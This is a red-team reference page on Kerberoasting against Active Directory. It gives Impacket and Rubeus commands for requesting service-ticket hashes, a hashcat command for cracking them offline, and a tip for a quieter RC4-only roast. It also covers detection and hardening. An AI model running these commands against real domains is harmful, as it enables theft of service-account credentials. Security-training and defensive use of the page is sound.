---
title: "Kerberoasting"
category: "red-team"
tags: ["active-directory", "kerberos", "credential-access"]
platform: "windows"
mitre: ["T1558.003"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Kerberoasting

## TL;DR
Any authenticated user can request a service ticket (TGS) for an account with an SPN. The ticket is encrypted with the service account's password hash → offline crack. Service accounts often have weak, static passwords.

## Requirements / Context
- Any domain credentials (even low-priv).
- The target account has an SPN set (`servicePrincipalName`).

## Commands
```bash
# From Linux (Impacket) – list kerberoastable and grab hashes
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 corp.local/user:'Pass' -outputfile hashes.txt

# Targeted at one account
impacket-GetUserSPNs -request-user svc_sql -dc-ip 10.10.10.10 corp.local/user:'Pass'
```
```powershell
# From Windows (Rubeus)
Rubeus.exe kerberoast /outfile:hashes.txt
# only weak ones (RC4)
Rubeus.exe kerberoast /rc4opsec
```

## Cracking
```bash
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule
# 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
```

## Detection (Blue Team)
```text
Event 4769 (TGS request) with:
 - Ticket Encryption Type 0x17 (RC4)  <- suspicious in an AES environment
 - one user requesting many SPNs in a short time
```
- Honeypot: an account with an SPN and a long password — any 4769 against it = alert.

## Mitigation / Hardening
- **gMSA / dMSA** (120+ char passwords, auto-rotation).
- Enforce AES on service accounts (disable RC4), long passwords (25+).
- Minimize accounts with SPNs; remove unused SPNs.

## Notes / Pitfalls
- `/rc4opsec` targets only accounts that still allow RC4 (quieter than a mass roast).

## Sources
- [Rubeus](https://github.com/GhostPack/Rubeus) · [MITRE T1558.003](https://attack.mitre.org/techniques/T1558/003/)
